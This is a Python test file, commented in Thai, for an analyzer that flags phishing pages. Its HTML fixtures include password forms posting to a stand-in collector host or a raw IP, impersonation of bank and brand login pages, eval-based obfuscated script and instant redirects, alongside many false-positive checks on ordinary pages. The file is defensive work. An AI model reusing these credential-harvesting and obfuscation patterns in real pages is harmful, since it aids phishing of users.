# -*- coding: utf-8 -*-
"""
test_content_analyzer.py — เทสต์ตัววิเคราะห์เนื้อหาหน้าเว็บ (ชั้นที่ 4)

เทสต์ชุดนี้เขียนได้เพราะตัววิเคราะห์ถูกแยกออกจากตัวดึงหน้าเว็บแล้ว — ป้อน HTML
ที่เขียนเองเข้าไปตรง ๆ **ไม่ต้องต่อเน็ตและไม่ต้องมี sandbox** วันไหนเปลี่ยนไปใช้
Chromium ดึงหน้าแทน requests เทสต์ชุดนี้ยังใช้ได้เหมือนเดิมทุกข้อ

เหมือนเทสต์ชั้นที่ 2 คือกันความผิดพลาดสองทิศพร้อมกัน:
  - false negative: หน้าฟิชชิ่งจริงหลุดไปได้
  - false positive: หน้าเว็บปกติโดนตีว่าอันตราย (ผู้ใช้เลิกเชื่อระบบ)
"""
from analyzer.content_analyzer import analyze_page


def bundle(html: str, final_url: str = "https://evil-site.xyz/login",
           js_rendered: bool = False) -> dict:
    """สร้าง page bundle ปลอมจาก HTML — เลียนสัญญาที่ page_fetch.fetch_page คืน"""
    return {"ok": True, "reason": "", "source": "test", "js_rendered": js_rendered,
            "final_url": final_url, "status": 200, "html": html, "raw_html": html,
            "network_posts": []}


def ids(html: str, page_reg: str = "evil-site.xyz", **kw) -> set:
    return {s["id"] for s in analyze_page(bundle(html, **kw), page_reg)["signals"]}


def facts(html: str, page_reg: str = "evil-site.xyz", **kw) -> set:
    return set(analyze_page(bundle(html, **kw), page_reg)["facts"])


# หน้าเว็บปกติที่ครบองค์ประกอบ ใช้เป็นฐานของเทสต์ false positive
NORMAL_PAGE = """
<html><head><title>ร้านขายต้นไม้ออนไลน์</title>
<link rel="icon" href="/favicon.ico"></head>
<body><h1>ยินดีต้อนรับ</h1>
<p>เราขายต้นไม้มา 10 ปี ส่งทั่วประเทศ มีหน้าร้านจริงที่เชียงใหม่
ติดต่อสอบถามได้ทุกวัน ตั้งแต่ 9 โมงเช้าถึง 6 โมงเย็น</p>
<a href="/about">เกี่ยวกับเรา</a> <a href="/contact">ติดต่อ</a>
<a href="/privacy">นโยบายความเป็นส่วนตัว</a>
<p>ต้นไม้ของเราคัดมาอย่างดี รับประกันการขนส่ง เปลี่ยนใหม่ถ้าเสียหาย
สั่งซื้อได้ที่หน้าร้านหรือทางออนไลน์ ชำระเงินปลายทางได้</p>
</body></html>
"""


class Testเช็กไม่ได้ต้องไม่เท่ากับเสี่ยง:
    def test_bundleที่ดึงไม่สำเร็จ(self):
        result = analyze_page({"ok": False, "html": ""}, "evil-site.xyz")
        assert result["checked"] is False
        assert result["signals"] == []

    def test_bundleว่าง(self):
        assert analyze_page({}, "evil-site.xyz")["checked"] is False
        assert analyze_page(None, "evil-site.xyz")["checked"] is False

    def test_ไม่รู้โดเมนของหน้าก็วิเคราะห์ไม่ได้(self):
        assert analyze_page(bundle(NORMAL_PAGE), "")["checked"] is False

    def test_ดึงมาแล้วไม่พบอะไรต่างจากดึงไม่ได้(self):
        """checked=True + ไม่มีสัญญาณแรง = "ดูแล้วไม่เจอ" ซึ่งไม่เหมือน "ดูไม่ได้" """
        result = analyze_page(bundle(NORMAL_PAGE), "evil-site.xyz")
        assert result["checked"] is True


class Testกลุ่ม1การล้วงข้อมูล:
    def test_ฟอร์มรหัสผ่านส่งข้ามโดเมน(self):
        html = """<form action="https://collector.tk/save" method="post">
                  <input type="password" name="p"></form>"""
        assert "form_action_mismatch" in ids(html)

    def test_ฟอร์มรหัสผ่านส่งไปที่เลขip(self):
        html = """<form action="http://203.0.113.9/save" method="post">
                  <input type="password" name="p"></form>"""
        assert "form_action_ip" in ids(html)

    def test_ช่องรหัสผ่านอยู่นอกฟอร์ม(self):
        html = """<div><input type="text" name="u">
                  <input type="password" name="p"><button>เข้าสู่ระบบ</button></div>"""
        assert "password_outside_form" in ids(html)

    def test_ฟอร์มรหัสผ่านส่งในโดเมนตัวเองไม่ติดสัญญาณ(self):
        """หน้าล็อกอินปกติต้องไม่ติดกฎกลุ่มนี้เลย"""
        html = """<form action="/login" method="post">
                  <input type="password" name="p"></form>"""
        got = ids(html)
        assert "form_action_mismatch" not in got
        assert "form_action_ip" not in got
        assert "password_outside_form" not in got

    def test_ช่องรหัสผ่านเป็นข้อเท็จจริงไม่ใช่สัญญาณ(self):
        html = """<form action="/login"><input type="password"></form>"""
        assert "has_password_input" in facts(html)


class Testกลุ่ม2เลียนแบบแบรนด์:
    def test_faviconดึงจากโดเมนแบรนด์จริง(self):
        html = '<html><head><link rel="icon" href="https://www.facebook.com/favicon.ico">' \
               '</head><body>x</body></html>'
        assert "favicon_brand_mismatch" in ids(html)

    def test_แบรนด์ในtitle(self):
        assert "content_brand_mismatch" in ids("<title>เข้าสู่ระบบ SCB Easy</title>")

    def test_แบรนด์ในh1ทั้งที่titleว่าง(self):
        """ท่าหลบกฎเดิมที่ดูแค่ title — ต้องจับได้แล้วหลังขยายไปจุดอื่น"""
        assert "content_brand_mismatch" in ids("<body><h1>Kbank Online</h1></body>")

    def test_แบรนด์ในmeta_description(self):
        html = '<head><meta name="description" content="ระบบล็อกอิน paypal อย่างเป็นทางการ"></head>'
        assert "content_brand_mismatch" in ids(html)

    def test_ซ่อนแบรนด์ด้วยhtml_entity(self):
        """&#103;oogle — คนอ่านเห็น google แต่การค้นหาตรง ๆ หาไม่เจอ"""
        got = ids("<title>&#103;oogle Account</title>")
        assert "brand_hidden_in_text" in got

    def test_ซ่อนแบรนด์ด้วยตัวเลข(self):
        assert "brand_hidden_in_text" in ids("<title>เข้าสู่ระบบ payp4l</title>")

    def test_เจ้าของโดเมนเองต้องไม่ติดว่าเลียนแบบตัวเอง(self):
        html = '<head><title>Facebook</title>' \
               '<link rel="icon" href="https://www.facebook.com/favicon.ico"></head>'
        got = ids(html, page_reg="facebook.com", final_url="https://facebook.com/")
        assert "content_brand_mismatch" not in got
        assert "favicon_brand_mismatch" not in got

    def test_ไอคอนโซเชียลท้ายหน้าต้องไม่ติด(self):
        """เคสจริงที่ทำให้ต้องถอดกฎออกสองข้อ: sanook.com ติดเพราะ alt="Google Play"
        และรูปที่ hotlink จาก facebook.com / youtube.com — เว็บไทยทั่วไปมีกันหมด
        เทสต์ข้อนี้มีไว้กันไม่ให้ใครเผลอใส่กฎกลับมาแบบเดิม"""
        html = """<html><head><title>ข่าวประจำวัน</title>
                  <link rel="icon" href="/favicon.ico"></head><body>
                  <h1>ข่าวเด่นวันนี้</h1>
                  <p>สรุปข่าวเศรษฐกิจและสังคมประจำวัน อ่านต่อได้ที่หน้าข่าวทั้งหมด
                  ติดตามเราได้ทุกช่องทางเพื่อไม่พลาดข่าวสารสำคัญ</p>
                  <a href="/news">ข่าวทั้งหมด</a>
                  <img src="https://www.facebook.com/icon.png" alt="Facebook">
                  <img src="https://www.youtube.com/thumb.jpg" alt="Google Play">
                  </body></html>"""
        got = ids(html, page_reg="thai-news.co.th",
                  final_url="https://thai-news.co.th/")
        assert "content_brand_mismatch" not in got
        assert "logo_hotlink_brand" not in got

    def test_เนื้อความทั่วไปที่พูดถึงแบรนด์ต้องไม่ติด(self):
        """บทความที่เอ่ยชื่อแบรนด์ในเนื้อความเป็นเรื่องปกติ ต้องไม่ตีว่าเลียนแบบ
        กฎจึงดูเฉพาะจุดที่ "ประกาศตัวตน" ของหน้า ไม่ใช่ทั้งหน้า"""
        html = """<html><head><title>รีวิวแอปแชท</title></head><body>
                  <h1>รีวิวประจำสัปดาห์</h1>
                  <p>สัปดาห์นี้เราเทียบ line กับ telegram ว่าตัวไหนใช้ง่ายกว่ากัน</p>
                  <a href="/more">อ่านต่อ</a></body></html>"""
        assert "content_brand_mismatch" not in ids(html)


class Testกลุ่ม3การอำพราง:
    def test_ก้อนbase64ยาวคู่กับคำสั่งรัน(self):
        blob = "QWxhZGRpbjpvcGVuc2VzYW1l" * 12   # ยาวเกิน 200 ตัวอักษร
        assert "js_obfuscated" in ids(f"<script>eval(atob('{blob}'));</script>")

    def test_ข้อความที่เขียนเป็นรหัสxNN(self):
        payload = "\\x68\\x65\\x6c\\x6c\\x6f" * 5   # 25 ตัว
        assert "js_obfuscated" in ids(f"<script>eval('{payload}');</script>")

    def test_รหัสตัวเลขทีละตัวอักษร(self):
        nums = ",".join(["104"] * 12)
        assert "js_obfuscated" in ids(f"<script>eval(String.fromCharCode({nums}))</script>")

    def test_มีแต่คำสั่งแต่ไม่มีก้อนข้อมูลที่เข้ารหัสไม่ติด(self):
        """เคสจริงจาก stackoverflow.com — สคริปต์โฆษณา/สถิติของเว็บดังมี eval กับ
        unescape ปนอยู่เป็นเรื่องปกติ ถ้านับแค่ "เจอคำสั่งพวกนี้" จะได้ false positive"""
        assert "js_obfuscated" not in ids(
            "<script>if(x){eval(cfg)} var u = unescape(q);</script>")

    def test_มีแต่ก้อนข้อมูลแต่ไม่มีคำสั่งรันไม่ติด(self):
        """รูปที่ฝังเป็น data URI ยาว ๆ ไม่ใช่การอำพรางโค้ด"""
        blob = "QWxhZGRpbjpvcGVuc2VzYW1l" * 12
        assert "js_obfuscated" not in ids(f"<script>var img = '{blob}';</script>")

    def test_meta_refreshเด้งทันที(self):
        html = '<head><meta http-equiv="refresh" content="0; url=https://elsewhere.tk/"></head>'
        assert "instant_redirect" in ids(html)

    def test_meta_refreshหน่วงนานไม่นับว่าเด้งทันที(self):
        html = '<head><meta http-equiv="refresh" content="30; url=/next"></head>'
        assert "instant_redirect" not in ids(html)

    def test_หน้าว่างที่มีแต่คำสั่งย้ายหน้า(self):
        html = "<html><body><script>location.replace('https://elsewhere.tk/')</script></body></html>"
        assert "instant_redirect" in ids(html)

    def test_หน้าปกติที่ใช้คำสั่งย้ายหน้าในปุ่มไม่ติด(self):
        html = NORMAL_PAGE.replace("</body>",
                                   "<script>btn.onclick=()=>location.href='/cart'</script></body>")
        assert "instant_redirect" not in ids(html)

    def test_ดักคลิกขวาและปุ่มf12(self):
        html = "<script>document.addEventListener('contextmenu',e=>e.preventDefault())</script>"
        assert "devtools_blocked" in ids(html)


class Testกลุ่ม4คุณภาพหน้าเว็บ:
    def test_ไม่มีfavicon(self):
        assert "no_favicon" in ids("<html><body>สวัสดี</body></html>")

    def test_ไม่มีลิงก์ไปหน้าอื่น(self):
        html = '<body><form action="/login"><input type="password"></form></body>'
        assert "single_page_no_links" in ids(html)

    def test_หน้าเล็กผิดปกติ(self):
        assert "html_too_small" in ids("<html><body>hi</body></html>")

    def test_no_faviconไม่บวกคะแนน(self):
        """กลุ่มนี้เป็นตัวประกอบ ไม่ใช่หลักฐาน — no_favicon ต้องไม่ดันคะแนนใครขึ้น"""
        signals = analyze_page(bundle("<html><body>สวัสดี</body></html>"),
                               "evil-site.xyz")["signals"]
        no_fav = next(s for s in signals if s["id"] == "no_favicon")
        assert no_fav["points"] == 0


class Testหน้าเว็บปกติต้องไม่โดนตีว่าอันตราย:
    def test_หน้าร้านค้าธรรมดาไม่มีสัญญาณแรง(self):
        signals = analyze_page(bundle(NORMAL_PAGE), "evil-site.xyz")["signals"]
        assert not [s for s in signals if s["severity"] in ("critical", "high")]

    def test_หน้าล็อกอินปกติของเว็บตัวเองไม่มีสัญญาณแรง(self):
        html = """<html><head><title>เข้าสู่ระบบ - ร้านต้นไม้</title>
                  <link rel="icon" href="/favicon.ico"></head><body>
                  <h1>เข้าสู่ระบบ</h1>
                  <form action="/session" method="post">
                  <input type="text" name="u"><input type="password" name="p">
                  <button>เข้าสู่ระบบ</button></form>
                  <a href="/forgot">ลืมรหัสผ่าน</a> <a href="/register">สมัครสมาชิก</a>
                  <p>ระบบสมาชิกของร้านต้นไม้ออนไลน์ ใช้สำหรับดูประวัติการสั่งซื้อ
                  และติดตามสถานะพัสดุของคุณเท่านั้น</p></body></html>"""
        signals = analyze_page(bundle(html), "evil-site.xyz")["signals"]
        assert not [s for s in signals if s["severity"] in ("critical", "high")]


class Testหน้าฟิชชิ่งเต็มรูปแบบ:
    def test_จับได้หลายสัญญาณพร้อมกัน(self):
        html = """<html><head><title>SCB Easy - เข้าสู่ระบบ</title>
                  <link rel="icon" href="https://www.scb.co.th/favicon.ico"></head>
                  <body><form action="https://collector.tk/x" method="post">
                  <input type="password" name="p"></form></body></html>"""
        got = ids(html)
        assert {"form_action_mismatch", "favicon_brand_mismatch",
                "content_brand_mismatch"} <= got


class Testสัญญาณที่ต้องใช้ข้อมูลจากsandbox:
    """กฎกลุ่มนี้เขียนไว้ล่วงหน้าแล้ว เทสต์ได้ด้วย bundle ปลอมโดยยังไม่ต้องมี Chromium
    จริง — นี่คือผลตอบแทนโดยตรงของการแยกตัวดึงออกจากตัววิเคราะห์"""

    def sandbox_bundle(self, html, raw_html=None, posts=None):
        return {"ok": True, "reason": "", "source": "sandbox", "js_rendered": True,
                "final_url": "https://evil-site.xyz/login", "status": 200,
                "html": html, "raw_html": raw_html if raw_html is not None else html,
                "network_posts": posts or []}

    def test_สคริปต์ยิงข้อมูลข้ามโดเมนจากหน้าที่ขอรหัสผ่าน(self):
        b = self.sandbox_bundle(
            '<form action="/x"><input type="password"></form>',
            posts=[{"url": "https://collector.tk/save", "cross_origin": True}])
        got = {s["id"] for s in analyze_page(b, "evil-site.xyz")["signals"]}
        assert "js_post_cross_origin" in got

    def test_ยิงข้อมูลในโดเมนตัวเองไม่ติด(self):
        b = self.sandbox_bundle(
            '<form action="/x"><input type="password"></form>',
            posts=[{"url": "https://evil-site.xyz/login", "cross_origin": False}])
        got = {s["id"] for s in analyze_page(b, "evil-site.xyz")["signals"]}
        assert "js_post_cross_origin" not in got

    def test_ไม่มีช่องรหัสผ่านก็ไม่ใช่การล้วงข้อมูล(self):
        """หน้าที่ยิง POST ข้ามโดเมนโดยไม่มีช่องรหัสผ่านคือเว็บทั่วไปที่ใช้ API ภายนอก"""
        b = self.sandbox_bundle(
            "<p>หน้าเว็บธรรมดา</p>",
            posts=[{"url": "https://api.example.com/track", "cross_origin": True}])
        got = {s["id"] for s in analyze_page(b, "evil-site.xyz")["signals"]}
        assert "js_post_cross_origin" not in got

    def test_หน้าเปล่าที่ถูกวาดด้วยสคริปต์ทั้งหมด(self):
        """ช่องโหว่ใหญ่ที่สุดที่ sandbox มาแก้: เซิร์ฟเวอร์ส่ง HTML เปล่ามา แล้วค่อย
        วาดหน้าล็อกอินด้วย JS — ตัวดึงแบบเดิมจะเห็นหน้าว่างแล้วสรุปว่าไม่พบอะไร"""
        rendered = """<html><body><h1>เข้าสู่ระบบเพื่อยืนยันตัวตนบัญชีธนาคารของท่าน</h1>
                      <form action="/x"><input type="password" name="pass">
                      <button>ยืนยันตัวตน</button></form>
                      <p>กรุณากรอกรหัสผ่านเพื่อปลดล็อกบัญชีภายในเวลาที่กำหนด</p>
                      </body></html>"""
        b = self.sandbox_bundle(rendered, raw_html="<html><body><div id=app></div></body></html>")
        got = {s["id"] for s in analyze_page(b, "evil-site.xyz")["signals"]}
        assert "dom_differs_from_source" in got

    def test_หน้าที่สคริปต์แค่แต่งเพิ่มเล็กน้อยไม่ติด(self):
        html = NORMAL_PAGE + "<p>เพิ่มโดยสคริปต์</p>"
        b = self.sandbox_bundle(html, raw_html=NORMAL_PAGE)
        got = {s["id"] for s in analyze_page(b, "evil-site.xyz")["signals"]}
        assert "dom_differs_from_source" not in got

    def test_bundleจากrequestsต้องเงียบสนิท(self):
        """ไม่ใช่ "ตรวจแล้วไม่เจอ" แต่เป็น "ยังไม่ได้ตรวจ" — ต้องไม่มีสัญญาณกลุ่มนี้เลย"""
        got = ids('<form action="/x"><input type="password"></form>')
        assert "js_post_cross_origin" not in got
        assert "dom_differs_from_source" not in got


class Testรายงานว่ายังไม่ได้รันjavascript:
    def test_bundleจากrequestsต้องบอกว่ายังไม่รันjs(self):
        assert "js_not_rendered" in facts(NORMAL_PAGE)

    def test_bundleจากsandboxไม่ต้องบอก(self):
        assert "js_not_rendered" not in facts(NORMAL_PAGE, js_rendered=True)
